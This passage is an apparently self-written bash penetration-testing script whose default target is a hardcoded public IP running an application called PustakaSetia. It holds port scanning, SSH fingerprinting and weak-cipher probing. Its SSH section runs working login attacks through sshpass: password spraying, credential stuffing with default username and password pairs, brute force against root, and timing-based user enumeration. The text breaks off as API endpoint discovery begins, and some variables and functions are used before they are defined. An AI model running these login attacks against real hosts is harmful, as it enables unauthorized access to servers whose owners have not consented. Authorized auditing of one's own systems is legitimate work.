#!/bin/bash

# =====================================
# COMPREHENSIVE SECURITY PENETRATION TEST
# Target: PustakaSetia Application
# Total Tests: 70+ (with Port Scan & Endpoint Discovery)
# =====================================
# DISCLAIMER: Hanya gunakan pada sistem yang Anda miliki/izini!
# =====================================

# Accept target from command line or use default
if [ -n "$1" ]; then
    INPUT_TARGET="$1"
else
    INPUT_TARGET="http://103.217.144.70:4401"
fi

# Parse target to extract host and port using robust bash string manipulation
if [[ "$INPUT_TARGET" =~ ^https?:// ]]; then
    TARGET="$INPUT_TARGET"
    # Remove protocol
    temp="${INPUT_TARGET#*://}"
    # Remove path
    temp="${temp%%/*}"
    # Extract host and port
    HOST="${temp%%:*}"
    if [[ "$temp" == *":"* ]]; then
        PORT="${temp#*:}"
    else
        # Determine default port based on protocol
        if [[ "$INPUT_TARGET" =~ ^https:// ]]; then
            PORT=443
        else
            PORT=80
        fi
    fi
else
    # Just IP/domain provided
    HOST="$INPUT_TARGET"
    PORT=80
    TARGET="http://$HOST"
fi

# --- RESUME CAPABILITY ---
if [ -f "$STATE_FILE" ]; then
    echo -e "${YELLOW}[!] Found previous session (saved state).${NC}"
    read -p "Do you want to RESUME the previous session? (Y/n) " -n 1 -r
    echo ""
    if [[ $REPLY =~ ^[Nn]$ ]]; then
        echo -e "${YELLOW}Starting NEW session...${NC}"
        rm "$STATE_FILE"
        REPORT_FILE="security_report_full_$(date +%Y%m%d_%H%M%S).txt"
    else
        echo -e "${GREEN}Resuming previous session...${NC}"
        source "$STATE_FILE"
        echo -e "Loading state: Step $LAST_COMPLETED_SECTION completed."
        echo -e "Appending to report: $REPORT_FILE"
    fi
else
    REPORT_FILE="security_report_full_$(date +%Y%m%d_%H%M%S).txt"
fi

TEST_COUNT=${TEST_COUNT:-0}
PASS_COUNT=${PASS_COUNT:-0}
WARN_COUNT=${WARN_COUNT:-0}
FAIL_COUNT=${FAIL_COUNT:-0}

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
WHITE='\033[1;37m'
GRAY='\033[0;90m'
NC='\033[0m'

# Progress tracking
TOTAL_SECTIONS=14
CURRENT_SECTION=0
SECTION_TESTS=0
SECTION_CURRENT=0
START_TIME=$(date +%s)

# Arrays to store discovered data
declare -a DISCOVERED_ENDPOINTS=()
declare -a OPEN_PORTS=()

# Global curl options (Reduced timeouts to prevent UI "stuck")
CURL_OPTS="-s -k -L --connect-timeout 3 --max-time 10"

# ============ PROGRESS BAR FUNCTIONS ============

# Draw progress bar
# Usage: draw_progress_bar current total width [color]
draw_progress_bar() {
    local current=$1
    local total=$2
    local width=${3:-40}
    local color=${4:-$GREEN}
    
    if [ "$total" -eq 0 ]; then
        total=1
    fi
    
    local percent=$((current * 100 / total))
    local filled=$((current * width / total))
    local empty=$((width - filled))
    
    # Build progress bar
    local bar=""
    for ((i=0; i<filled; i++)); do
        bar+="█"
    done
    for ((i=0; i<empty; i++)); do
        bar+="░"
    done
    
    printf "${color}[${bar}]${NC} ${WHITE}%3d%%${NC}" "$percent"
}

# Show global progress
show_global_progress() {
    local elapsed=$(($(date +%s) - START_TIME))
    local mins=$((elapsed / 60))
    local secs=$((elapsed % 60))
    
    echo -ne "\r${GRAY}Global: ${NC}"
    draw_progress_bar "$CURRENT_SECTION" "$TOTAL_SECTIONS" 30 "$CYAN"
    printf " ${GRAY}| Section %d/%d | Time: %02d:%02d${NC}   " "$CURRENT_SECTION" "$TOTAL_SECTIONS" "$mins" "$secs"
}

# Show section progress (inline update)
show_section_progress() {
    local current=$1
    local total=$2
    local desc=${3:-"Testing"}
    
    echo -ne "\r  ${GRAY}$desc: ${NC}"
    draw_progress_bar "$current" "$total" 25 "$BLUE"
    printf " ${GRAY}(%d/%d)${NC}   " "$current" "$total"
}

# Clear progress line
clear_progress() {
    echo -ne "\r\033[K"
}

# State file for resume capability
STATE_FILE=".pentest_state"
SKIP_SECTION=false
LAST_COMPLETED_SECTION=0

# Save progress to state file
save_progress() {
    # Debug: Confirm saving
    # echo "DEBUG: Saving state to $STATE_FILE..." 
    
    cat > "$STATE_FILE" << EOF
LAST_COMPLETED_SECTION=$CURRENT_SECTION
REPORT_FILE="$REPORT_FILE"
TARGET="$TARGET"
HOST="$HOST"
PORT="$PORT"
START_TIME=$START_TIME
TEST_COUNT=$TEST_COUNT
PASS_COUNT=$PASS_COUNT
WARN_COUNT=$WARN_COUNT
FAIL_COUNT=$FAIL_COUNT
EOF
    # Preserve arrays safely
    declare -p OPEN_PORTS >> "$STATE_FILE"
    declare -p DISCOVERED_ENDPOINTS >> "$STATE_FILE"
}

# ============================================
# SCAN MODE SELECTION
# ============================================
echo -e "${CYAN}Select Scan Mode:${NC}"
echo "1. Full Scan (All Checks)"
echo "2. Infrastructure Audit (Ports, SSH)"
echo "3. Web Application Assessment (API, Vulns)"
echo "4. SSH Security Deep Dive (Audit + Brute Force)"
echo "5. Custom Selection (Choose specific modules)"
echo -n "Enter your choice [1-5]: "
read -r SCAN_MODE_CHOICE

case $SCAN_MODE_CHOICE in
    2)
        SELECTED_MODE="INFRA"
        log_info "Mode Selected: Infrastructure Audit"
        ;;
    3)
        SELECTED_MODE="WEB"
        log_info "Mode Selected: Web Application Assessment"
        ;;
    4)
        SELECTED_MODE="SSH"
        log_info "Mode Selected: SSH Security Deep Dive"
        ;;
    5)
        SELECTED_MODE="CUSTOM"
        echo -e "${YELLOW}Available Sections: 0 (Ports), 0.2 (SSH Audit), 0.3 (Brute Force), 0.5 (API Discovery), 1-13 (Web Vulns)${NC}"
        echo -n "Enter section numbers to run (space separated, e.g., '0 0.3 5 10'): "
        read -r -a CUSTOM_LIST
        log_info "Mode Selected: Custom Selection (${CUSTOM_LIST[*]})"
        ;;
    *)
        SELECTED_MODE="ALL"
        log_info "Mode Selected: Full Scan"
        ;;
esac

# Start new section (Modified for Resume & Selection Capability)
start_section() {
    local name=$1
    local tests=$2
    
    ((CURRENT_SECTION++))
    
    # 1. Resume Logic: Skip if we already did this section in previous session
    # Note: If MODE is effectively skipping, we treat it as skipped too.
    if [ "$CURRENT_SECTION" -le "$LAST_COMPLETED_SECTION" ]; then
        echo -e "\n${CYAN}════════════════════════════════════════════${NC}"
        echo -e "${CYAN}  $name${NC}"
        echo -e "${GREEN}  [SKIPPED] Already completed in previous session.${NC}"
        SKIP_SECTION=true
        return
    fi

    # 2. Mode Selection Logic: Filter sections based on SELECTED_MODE
    local should_run=false
    
    if [ "$SELECTED_MODE" == "ALL" ]; then
        should_run=true
    elif [ "$SELECTED_MODE" == "CUSTOM" ]; then
        # Extract ID from "SECTION X.Y: ..." -> "X.Y" or "X"
        # Logic: removed "SECTION", remove space, take first part before colon
        local sec_id=$(echo "$name" | sed 's/SECTION //g' | awk -F: '{print $1}')
        
        # Check if sec_id is in CUSTOM_LIST
        for target_id in "${CUSTOM_LIST[@]}"; do
            if [ "$target_id" == "$sec_id" ]; then
                should_run=true
                break
            fi
        done
        
        # Debugging (optional, removed for prod)
        # echo "DEBUG: Checking Section '$name' (ID: $sec_id) against [${CUSTOM_LIST[*]}] -> Run: $should_run"
        
    elif [ "$SELECTED_MODE" == "INFRA" ]; then
        if [[ "$name" == *"PORT"* ]] || [[ "$name" == *"SSH"* ]]; then should_run=true; fi
    elif [ "$SELECTED_MODE" == "WEB" ]; then
        if [[ "$name" != *"PORT"* ]] && [[ "$name" != *"SSH"* ]]; then should_run=true; fi
    elif [ "$SELECTED_MODE" == "SSH" ]; then
        if [[ "$name" == *"SSH"* ]]; then should_run=true; fi
    fi

    if [ "$should_run" = false ]; then
        echo -e "\n${CYAN}════════════════════════════════════════════${NC}"
        echo -e "${CYAN}  $name${NC}"
        echo -e "${YELLOW}  [SKIPPED] Not included in selected mode ($SELECTED_MODE).${NC}"
        SKIP_SECTION=true
        return
    fi
    
    SKIP_SECTION=false
    SECTION_TESTS=$tests
    SECTION_CURRENT=0
    
    echo ""
    show_global_progress
    echo ""
    echo -e "${CYAN}════════════════════════════════════════════${NC}"
    echo -e "${CYAN}  $name${NC}"
    echo -e "${CYAN}════════════════════════════════════════════${NC}"
    
    # Only verify write to file if not skipping and file exists
    if [ -f "$REPORT_FILE" ]; then
        echo "" >> "$REPORT_FILE"
        echo "=== $name ===" >> "$REPORT_FILE"
    fi
}

# Update section progress
update_section_progress() {
    local desc=${1:-"Testing"}
    ((SECTION_CURRENT++))
    show_section_progress "$SECTION_CURRENT" "$SECTION_TESTS" "$desc"
}

# Complete section
complete_section() {
    if [ "$SKIP_SECTION" = true ]; then
        return
    fi
    clear_progress
    echo -e "  ${GREEN}✓ Section complete${NC} (${SECTION_CURRENT}/${SECTION_TESTS} tests)"
    # Auto-save after every section
    save_progress
}

# ============ PROGRESS BAR FUNCTIONS ============

# ... (Previous Progress Bar Code) ...

# ============ LOGGING & HELPER FUNCTIONS (Moved Up) ============

print_header() {
    echo -e "\n${CYAN}════════════════════════════════════════════${NC}"
    echo -e "${CYAN}  $1${NC}"
    echo -e "${CYAN}════════════════════════════════════════════${NC}"
    echo "" >> "$REPORT_FILE"
    echo "=== $1 ===" >> "$REPORT_FILE"
}

print_subheader() {
    echo -e "\n${BLUE}--- $1 ---${NC}"
    echo "--- $1 ---" >> "$REPORT_FILE"
}

log_result() {
    ((TEST_COUNT++))
    local status=$1
    local message=$2
    
    clear_progress
    
    case $status in
        "PASS")
            ((PASS_COUNT++))
            echo -e "${GREEN}[✓ PASS]${NC} #$TEST_COUNT: $message"
            ;;
        "WARN")
            ((WARN_COUNT++))
            echo -e "${YELLOW}[! WARN]${NC} #$TEST_COUNT: $message"
            ;;
        "FAIL")
            ((FAIL_COUNT++))
            echo -e "${RED}[✗ FAIL]${NC} #$TEST_COUNT: $message"
            ;;
        "INFO")
            echo -e "${MAGENTA}[i INFO]${NC} $message"
            ;;
    esac
    [ "$status" != "INFO" ] && echo "[$status] #$TEST_COUNT: $message" >> "$REPORT_FILE"
}

log_info() {
    clear_progress
    echo -e "${MAGENTA}[i]${NC} $1"
    echo "[INFO] $1" >> "$REPORT_FILE"
}

# ============ END HELPER FUNCTIONS ============

# Check if port is open (Multi-strategy: Windows curl.exe -> nc -> perl -> bash)
check_port() {
    local host=$1
    local port=$2
    
    # Strategy 0: Windows curl.exe (Best for WSL users)
    # Check if curl.exe exists (not normal curl)
    if command -v curl.exe >/dev/null 2>&1; then
        # Use Windows curl to check connection (supersonic reliable on WSL)
        # We redirect output to null, if it returns exit code 0 (even 404/403/500 is connection success), then port is open.
        # But wait, curl fails if 404? No. But connection refused is fail.
        # Using --connect-timeout 2
        if curl.exe -s -I "http://$host:$port" --connect-timeout 2 --max-time 3 >/dev/null 2>&1; then
            return 0
        fi
        
        # If http failed (maybe it's not http port), we can't easily use curl for raw tcp.
        # But for 4401/80 it should work.
    fi

    # Strategy 1: netcat (nc)
    if command -v nc >/dev/null 2>&1; then
        nc -z -w 3 "$host" "$port" >/dev/null 2>&1 && return 0
    fi
    
    # Strategy 2: Perl
    if command -v perl >/dev/null 2>&1; then
        perl -MIO::Socket::INET -e "exit(!defined(IO::Socket::INET->new(PeerAddr=>'$host',PeerPort=>$port,Proto=>'tcp',Timeout=>3)))" >/dev/null 2>&1 && return 0
    fi
    
    # Strategy 3: Bash /dev/tcp
    if command -v timeout >/dev/null 2>&1; then
        timeout 2 bash -c "echo >/dev/tcp/$host/$port" >/dev/null 2>&1 && return 0
    else
        (echo >/dev/tcp/"$host"/"$port") >/dev/null 2>&1 &
        local pid=$!
        local count=0
        while kill -0 $pid 2>/dev/null; do
            sleep 0.1
            ((count++))
            if [ $count -gt 20 ]; then kill $pid 2>/dev/null; return 1; fi
        done
        wait $pid 2>/dev/null
        return $?
    fi
    
    return 1
}

# Diagnostic function to run when nothing is found
run_connectivity_diagnostic() {
    local host=$1
    local port=$2
    
    log_info "running DIAGNOSTIC on $host:$port..."
    echo -e "${YELLOW}[DIAGNOSTIC DETAILS]${NC}"
    
    # 1. DNS Check
    echo -n "1. Checking DNS/IP resolution... "
    if host "$host" >/dev/null 2>&1; then echo "OK"; else echo "SKIP (tool missing)"; fi
    
    # 2. Ping (Try Linux first, then Windows Powershell)
    echo -n "2. Pinging host... "
    if ping -c 1 -W 3 "$host" >/dev/null 2>&1; then 
        echo -e "${GREEN}COMPLETED (Linux Ping)${NC}"
    elif command -v powershell.exe >/dev/null 2>&1; then
        # Try Windows Ping via PowerShell (Bypasses WSL Firewall)
        if powershell.exe -Command "Test-Connection -ComputerName $host -Count 1 -Quiet" | grep -q "True"; then
             echo -e "${GREEN}COMPLETED (Windows Ping)${NC}"
        else
             echo -e "${RED}NO RESPONSE${NC} (Host might block ICMP)"
        fi
    else 
        echo -e "${RED}NO RESPONSE${NC} (Host might block ping)"
    fi
    
    # 3. Port Check (Try Curl.exe)
    echo "3. Testing specific port $port:"
    if command -v curl.exe >/dev/null 2>&1; then
        echo "   > Running: curl.exe -v http://$host:$port"
        curl.exe -v "http://$host:$port" --connect-timeout 5 2>&1 | grep -iE "connect|fail|refused|timed|connected" | head -n 5
    else
        echo "   > Running: nc -v -z -w 5 $host $port"
        nc -v -z -w 5 "$host" "$port" 2>&1 | head -n 3
    fi
}

# Initialize report
cat > "$REPORT_FILE" << EOF
╔════════════════════════════════════════════════════════════════════════╗
║             COMPREHENSIVE SECURITY PENETRATION TEST REPORT             ║
╠════════════════════════════════════════════════════════════════════════╣
$(printf "║  %-12s %-54s ║\n" "Target:" "$TARGET")
$(printf "║  %-12s %-54s ║\n" "Host:" "$HOST")
$(printf "║  %-12s %-54s ║\n" "Port:" "$PORT")
$(printf "║  %-12s %-54s ║\n" "Date:" "$(date)")
║  Tester:       Automated Script v3.2 (Fixed for Windows/VPS)           ║
╚════════════════════════════════════════════════════════════════════════╝

EOF

echo -e "${CYAN}"
echo "╔════════════════════════════════════════════════════════════════════════╗"
echo "║             COMPREHENSIVE SECURITY PENETRATION TEST v3.2               ║"
echo "╠════════════════════════════════════════════════════════════════════════╣"
printf "║  %-12s %-54s ║\n" "Target:" "$TARGET"
printf "║  %-12s %-54s ║\n" "Host:" "$HOST"
printf "║  %-12s %-54s ║\n" "Port:" "$PORT"
echo "╚════════════════════════════════════════════════════════════════════════╝"
echo -e "${NC}"

# ============================================
# PRE-FLIGHT CHECK: CONNECTIVITY
# ============================================
print_header "PRE-FLIGHT CONNECTIVITY CHECK"

log_info "Testing connection to $TARGET..."

TARGET_REACHABLE=true
# Try simple HEAD request first with timeout
HTTP_CODE=$(curl -o /dev/null -w "%{http_code}" $CURL_OPTS "$TARGET")
CURL_EXIT=$?

if [ $CURL_EXIT -eq 0 ] && [ "$HTTP_CODE" != "000" ]; then
    log_result "PASS" "Successfully connected to $TARGET (HTTP $HTTP_CODE)"
else
    log_result "FAIL" "Could not connect to $TARGET (HTTP $HTTP_CODE)"
    echo -e "${RED}[!] CRITICAL ERROR: Target is unreachable!${NC}"
    echo -e "${YELLOW}Possible causes:${NC}"
    echo "1. The server ($HOST) is down or blocking your IP."
    echo "2. Port $PORT is closed or filtered by a firewall."
    echo "3. You need a VPN to access this internal IP (${TARGET})."
    
    # Run diagnostic immediately
    run_connectivity_diagnostic "$HOST" "$PORT"
    
    read -p "Target unreachable. Continue anyway? (y/N) " -n 1 -r
    echo ""
    if [[ ! $REPLY =~ ^[Yy]$ ]]; then
        echo -e "${RED}Aborting test.${NC}"
        exit 1
    fi
    TARGET_REACHABLE=false
fi

# ============================================
# SECTION 0: PORT SCANNING
# ============================================
start_section "SECTION 0: PORT SCANNING" 31

if [ "$SKIP_SECTION" = false ]; then
    # Common web/app ports to scan
    declare -a PORTS_TO_SCAN=(
        21 22 
        # 23 25 53 80 110 143 443 445 
        # 993 995 1433 1521 3000 3001 3306 3389 
        # 4000 4401 5000 5432 5900 6379 8000 8080 
        # 8443 8888 9000 9090 27017
    )

    log_info "Scanning ${#PORTS_TO_SCAN[@]} common ports on $HOST..."
    log_info "Strategy: nc/perl/bash (trying best available method)"

    PORT_INDEX=0
    for port in "${PORTS_TO_SCAN[@]}"; do
        ((PORT_INDEX++))
        show_section_progress "$PORT_INDEX" "${#PORTS_TO_SCAN[@]}" "Scanning ports"
        
        if check_port "$HOST" "$port"; then
            OPEN_PORTS+=("$port")
            clear_progress
            echo -e "  ${GREEN}[OPEN]${NC} Port $port"
            echo "[OPEN] Port $port" >> "$REPORT_FILE"
        fi
    done
    clear_progress

    echo ""
    if [ ${#OPEN_PORTS[@]} -gt 0 ]; then
        log_info "Found ${#OPEN_PORTS[@]} open ports: ${OPEN_PORTS[*]}"
        
        # Security checks for dangerous ports
        for port in "${OPEN_PORTS[@]}"; do
            case $port in
                21) log_result "WARN" "FTP (21) is open - consider SFTP instead" ;;
                22) log_result "PASS" "SSH (22) is open - ensure key-based auth" ;;
                23) log_result "FAIL" "Telnet (23) is open - DANGEROUS, disable immediately!" ;;
                3306) log_result "WARN" "MySQL (3306) is open - ensure not exposed to internet" ;;
                5432) log_result "WARN" "PostgreSQL (5432) is open - ensure not exposed to internet" ;;
                6379) log_result "FAIL" "Redis (6379) is open - DANGEROUS if no auth!" ;;
                27017) log_result "FAIL" "MongoDB (27017) is open - DANGEROUS if no auth!" ;;
            esac
        done
    else
        log_result "WARN" "No common ports found open (Connection might be blocked/filtered)"
        # Try ping to verify host is up
        ping -c 1 -W 2 "$HOST" >/dev/null 2>&1
        if [ $? -eq 0 ]; then
             log_info "Host is responding to PING, but ports look closed."
        else
             log_info "Host is NOT responding to PING."
        fi
    fi
fi
complete_section

# ============================================
# SECTION 0.2: ADVANCED SSH SECURITY AUDIT (5 Techniques)
# ============================================
start_section "SECTION 0.2: ADVANCED SSH SECURITY AUDIT" 5

if [ "$SKIP_SECTION" = false ]; then
    SSH_PORT=22
    # Check known ports
    if [[ " ${OPEN_PORTS[*]} " =~ " ${SSH_PORT} " ]] || [[ " ${OPEN_PORTS[*]} " =~ " 2222 " ]]; then
        if [[ " ${OPEN_PORTS[*]} " =~ " 2222 " ]]; then SSH_PORT=2222; fi
        log_info "Targeting SSH Port: $SSH_PORT"

        # --- TECHNIQUE 1: BANNER GRABBING & OS FINGERPRINTING ---
        update_section_progress "Tech 1: Banner & OS Intel"
        
        # Grab detailed banner
        SSH_BANNER=$(echo "" | nc -w 2 $HOST $SSH_PORT 2>/dev/null | head -n 1)
        
        if [ -z "$SSH_BANNER" ]; then
            # Fallback using ssh specific verbose output - FORCED NON-INTERACTIVE
            SSH_BANNER=$(ssh -v -o BatchMode=yes -o PasswordAuthentication=no -p $SSH_PORT "fake@$HOST" 2>&1 | grep "Remote protocol version" | awk '{print $NF}' | tr -d '\r')
        fi
        
        if [ -n "$SSH_BANNER" ]; then
            log_result "INFO" "Banner: $SSH_BANNER"
            
            # OS Guessing based on banner suffix (e.g. ...ubuntu0.1)
            if [[ "$SSH_BANNER" =~ "Ubuntu" ]]; then
                log_result "INFO" "OS Detected: Ubuntu Linux (via banner)"
            elif [[ "$SSH_BANNER" =~ "Debian" ]]; then
                log_result "INFO" "OS Detected: Debian Linux (via banner)"
            fi
        else
            log_result "WARN" "Banner hidden or unreachable (Good for security, bad for audit)"
        fi

        # --- TECHNIQUE 2: CVE VULNERABILITY ANALYSIS (Version Based) ---
        update_section_progress "Tech 2: Vulnerability Analysis"
        
        # Extract clean version number (e.g., OpenSSH_7.4p1 -> 7.4)
        SSH_VER=$(echo "$SSH_BANNER" | grep -oP "OpenSSH_\K[0-9.]+" 2>/dev/null)
        
        if [ -n "$SSH_VER" ]; then
            log_result "INFO" "Detected OpenSSH Version: $SSH_VER"
            
            # Check for RegreSSHion (CVE-2024-6387) - Affects < 4.4p1 and 8.5p1 <= v < 9.8p1
            # Simple string comparison logic
            if [[ "$SSH_VER" > "8.5" ]] && [[ "$SSH_VER" < "9.8" ]]; then
                log_result "FAIL" "Potentially Vulnerable to RegreSSHion (CVE-2024-6387)!"
            elif [[ "$SSH_VER" < "7.4" ]]; then
                log_result "WARN" "Old SSH Version detected. Potentially vulnerable to user enumeration."
            else
                log_result "PASS" "Version seems patched against recent critical CVEs."
            fi
        else
            log_result "INFO" "Could not extract version for CVE analysis."
        fi

        # --- TECHNIQUE 3: WEAK ENCRYPTION AUDIT (Crypto Policy) ---
        update_section_progress "Tech 3: Weak Crypto Audit"
        
        WEAK_FOUND=false
        # List of legacy algorithms to test
        declare -a WEAK_ALGOS=("3des-cbc" "aes128-cbc" "hmac-md5" "arcfour")
        
        for algo in "${WEAK_ALGOS[@]}"; do
            # Try to force connection with weak algo
            # If server replies (even if permission denied), it supports the algo.
            OUTPUT=$(ssh -v -o BatchMode=yes -o StrictHostKeyChecking=no -o Ciphers=$algo -p $SSH_PORT "check@$HOST" 2>&1)
            
            if [[ "$OUTPUT" != *"no matching cipher"* ]] && [[ "$OUTPUT" != *"failure"* ]]; then
                # If we got to authentication stage, the cipher was accepted
                if [[ "$OUTPUT" =~ "Permission denied" ]] || [[ "$OUTPUT" =~ "password" ]]; then
                    log_result "WARN" "Weak Cipher Supported: $algo"
                    WEAK_FOUND=true
                fi
            fi
        done
        
        if [ "$WEAK_FOUND" = false ]; then
            log_result "PASS" "Server rejects legacy ciphers (3DES, Arcfour, etc)"
        fi

        # --- TECHNIQUE 4: AUTH POLICY & ROOT LOGIN CHECK ---
        update_section_progress "Tech 4: Auth & Root Policy"
        
        # Check supported methods (Capture full verbose output)
        # We look for "Authentications that can continue" or "Next authentication method"
        SSH_DEBUG_OUT=$(ssh -v -o BatchMode=yes -o StrictHostKeyChecking=no -p $SSH_PORT "root@$HOST" 2>&1)
        
        # Extract methods (handled case-insensitively)
        METHODS=$(echo "$SSH_DEBUG_OUT" | grep -i "authentications that can continue" | tail -n 1)
        
        # Clean up output for extracting raw methods
        RAW_METHODS=$(echo "$METHODS" | sed 's/.*continue: //g' | tr -d '\r')
        
        if [ -n "$RAW_METHODS" ]; then
             log_info "Auth Methods Detected: $RAW_METHODS"
        fi

        # Logic decision
        if echo "$METHODS" | grep -qi "password"; then
            log_result "WARN" "Password Auth ENABLED (Brute-force surface open)"
            log_result "FAIL" "Root login permitted via Password (HIGH RISK)"
            BRUTE_FORCE_READY=true
        elif echo "$METHODS" | grep -qi "keyboard-interactive"; then
            log_result "WARN" "Interactive Auth ENABLED (Similar to password)"
            BRUTE_FORCE_READY=true
        else
            # Only pass if we strictly see publickey and NOT password
            if echo "$METHODS" | grep -qi "publickey"; then
                log_result "PASS" "Password Auth DISABLED (Keys only)"
                log_result "PASS" "Root password login disabled"
            else
                # Fallback if grep failed entirely (maybe output format different)
                log_result "WARN" "Could not determine auth methods (Manual check advised)"
                # Assume true for safety (let brute force try)
            fi
            BRUTE_FORCE_READY=false
        fi

        # --- TECHNIQUE 5: DICTIONARY ATTACK (Moved to Section 0.3) ---
        update_section_progress "Tech 5: Brute Force Prep"
        log_info "Deep dictionary attack moved to Section 0.3"

    else
        log_info "SSH Port Closed. Skipping."
    fi
fi
complete_section

# ============================================
# SECTION 0.3: ADVANCED AUTHENTICATION ATTACKS (SSH)
# ============================================
start_section "SECTION 0.3: ADVANCED SSH AUTH ATTACKS" 5

if [ "$SKIP_SECTION" = false ]; then
    update_section_progress "Initializing Auth Attacks"
    
    # Check SSH Port
    SSH_PORT=22
    IS_SSH_OPEN=false
    if [ ${#OPEN_PORTS[@]} -gt 0 ]; then
        for p in "${OPEN_PORTS[@]}"; do
            if [ "$p" == "22" ] || [ "$p" == "2222" ]; then SSH_PORT=$p; IS_SSH_OPEN=true; break; fi
        done
    else
        if nc -z -w 2 "$HOST" 22 2>/dev/null; then IS_SSH_OPEN=true; SSH_PORT=22; fi
    fi

    if [ "$IS_SSH_OPEN" = true ]; then
        
        SSHPASS_AVAIL=false
        if command -v sshpass >/dev/null 2>&1; then 
            SSHPASS_AVAIL=true
        else
            echo -e "${YELLOW}[!] WARNING: Tool 'sshpass' is missing.${NC}"
            echo -e "    Required for techniques 1, 2, 3, and 5."
            echo -e "    Install it via: ${GREEN}sudo apt install sshpass${NC}"
        fi

        # --- TECHNIQUE 1: PASSWORD SPRAYING (Low & Slow) ---
        # Strategy: Try ONE common password against MANY users to avoid lockout
        update_section_progress "Tech 1: Password Spraying"
        log_info "Technique 1: Password Spraying (1 Password vs Many Users)..."
        
        if [ "$SSHPASS_AVAIL" = true ]; then
            SPRAY_PASS="Password123"
            declare -a TARGET_USERS=("root" "admin" "user" "support" "backup" "deploy" "git")
            SPRAY_SUCCESS=false
            
            for user in "${TARGET_USERS[@]}"; do
                sshpass -p "$SPRAY_PASS" ssh -q -o StrictHostKeyChecking=no -o ConnectTimeout=3 -p $SSH_PORT "$user@$HOST" "exit" 2>/dev/null
                if [ $? -eq 0 ]; then
                     log_result "FAIL" "SPRAY SUCCESS: User '$user' uses password '$SPRAY_PASS'"
                     SPRAY_SUCCESS=true
                fi
            done
            
            if [ "$SPRAY_SUCCESS" = false ]; then
                log_result "PASS" "Password Spraying failed (Common password '$SPRAY_PASS' not found)"
            fi
        else
            log_result "WARN" "Skipping (sshpass missing - see above)"
        fi

        # --- TECHNIQUE 2: CREDENTIAL STUFFING (Targeted Pairs) ---
        # Strategy: Try specific User:Pass combos likely leaked from other breaches
        update_section_progress "Tech 2: Credential Stuffing"
        log_info "Technique 2: Credential Stuffing (Simulating Leaked Pairs)..."
        
        if [ "$SSHPASS_AVAIL" = true ]; then
            declare -a STUFF_LIST=(
                "admin:admin" "root:toor" "user:password" "guest:guest" 
                "postgres:postgres" "oracle:oracle" "pi:raspberry" "ubuntu:ubuntu"
            )
            STUFF_FOUND=false
            
            for pair in "${STUFF_LIST[@]}"; do
                user="${pair%%:*}"
                pass="${pair#*:}"
                sshpass -p "$pass" ssh -q -o StrictHostKeyChecking=no -o ConnectTimeout=3 -p $SSH_PORT "$user@$HOST" "exit" 2>/dev/null
                if [ $? -eq 0 ]; then
                    log_result "FAIL" "STUFFING SUCCESS: Valid Pair $user / $pass"
                    STUFF_FOUND=true
                    echo -e "${RED}[!!!] CREDENTIAL STUFFING SUCCESS: $user / $pass ${NC}"
                fi
            done
            
            if [ "$STUFF_FOUND" = false ]; then
                log_result "PASS" "Credential Stuffing failed (No common leaked pairs worked)"
            fi
        else
             log_result "WARN" "Skipping (sshpass missing)"
        fi

        # --- TECHNIQUE 3: TRADITIONAL BRUTE FORCE (Hammering) ---
        # Strategy: Many Passwords vs One High-Value User (root)
        update_section_progress "Tech 3: Root Brute Force"
        log_info "Technique 3: Traditional Brute Force (Target: root)..."
        
        if [ "$SSHPASS_AVAIL" = true ]; then
            declare -a ROOT_PASS_LIST=("123456" "password" "12345678" "root" "welcome" "login")
            BRUTE_FOUND=false
            
            for pass in "${ROOT_PASS_LIST[@]}"; do
                sshpass -p "$pass" ssh -q -o StrictHostKeyChecking=no -o ConnectTimeout=3 -p $SSH_PORT "root@$HOST" "exit" 2>/dev/null
                if [ $? -eq 0 ]; then
                    log_result "FAIL" "BRUTE FORCE SUCCESS: root / $pass"
                    BRUTE_FOUND=true
                    break
                fi
            done
            
            if [ "$BRUTE_FOUND" = false ]; then
                log_result "PASS" "Root Brute Force failed (Top 6 common passwords)"
            fi
        else
            log_result "WARN" "Skipping (sshpass missing)"
        fi

        # --- TECHNIQUE 4: TIMING ANALYSIS (User Enumeration) ---
        update_section_progress "Tech 4: Timing Analysis"
        log_info "Technique 4: Side-Channel Timing Analysis..."
        
        START_ROOT=$(date +%s%N)
        ssh -o BatchMode=yes -o StrictHostKeyChecking=no -p $SSH_PORT "root@$HOST" 2>&1 >/dev/null
        END_ROOT=$(date +%s%N)
        TIME_ROOT=$(( (END_ROOT - START_ROOT) / 1000000 ))

        START_FAKE=$(date +%s%N)
        ssh -o BatchMode=yes -o StrictHostKeyChecking=no -p $SSH_PORT "fake_user_XVZ@$HOST" 2>&1 >/dev/null
        END_FAKE=$(date +%s%N)
        TIME_FAKE=$(( (END_FAKE - START_FAKE) / 1000000 ))
        
        DIFF=$(( TIME_ROOT - TIME_FAKE ))
        if [ $DIFF -lt 0 ]; then DIFF=$(( -1 * DIFF )); fi

        log_info "Root: ${TIME_ROOT}ms | Fake: ${TIME_FAKE}ms | Diff: ${DIFF}ms"
        if [ $DIFF -gt 250 ]; then
             log_result "WARN" "Timing Side-Channel: Significant difference ($DIFF ms) allows User Enum."
        else
             log_result "PASS" "Timing resistant (Response times similar)."
        fi

        # --- TECHNIQUE 5: SSH REPLAY / PROTOCOL DOWNGRADE CHECK ---
        update_section_progress "Tech 5: Replay & Protocol Check"
        log_info "Technique 5: Checking for Protocol 1 (Replay Attack Vulnerability)..."
        
        # Safe banner grab using NC if available, or SSH non-interactive
        if command -v nc >/dev/null 2>&1; then
             PROTO_VER=$(echo "" | nc -w 2 $HOST $SSH_PORT 2>/dev/null | head -n 1)
        else
             # Forced non-interactive ssh check
             PROTO_VER=$(ssh -v -o BatchMode=yes -o StrictHostKeyChecking=no -p $SSH_PORT "test@$HOST" 2>&1 | grep "Remote protocol version" | awk '{print $NF}' | tr -d '\r')
        fi
        
        if [[ "$PROTO_VER" == *"1.99"* ]] || [[ "$PROTO_VER" == *"1.5"* ]]; then
             log_result "FAIL" "Protocol 1 Supported ($PROTO_VER). Vulnerable to REPLAY ATTACKS."
        else
             log_result "PASS" "Protocol 2 Only ($PROTO_VER). Secure against simple Replay."
        fi

    else
        log_info "SSH Port closed or unreachable. Skipping access audit."
    fi
fi
complete_section
start_section "SECTION 0.5: API ENDPOINT DISCOVERY" 60

if [ "$SKIP_SECTION" = false ]; then
    # Common API paths to discover
    declare -a COMMON_ENDPOINTS=(
        "/api"
        "/api/v1"
        "/api/v2"
        "/api/auth"
        "/api/auth/login"
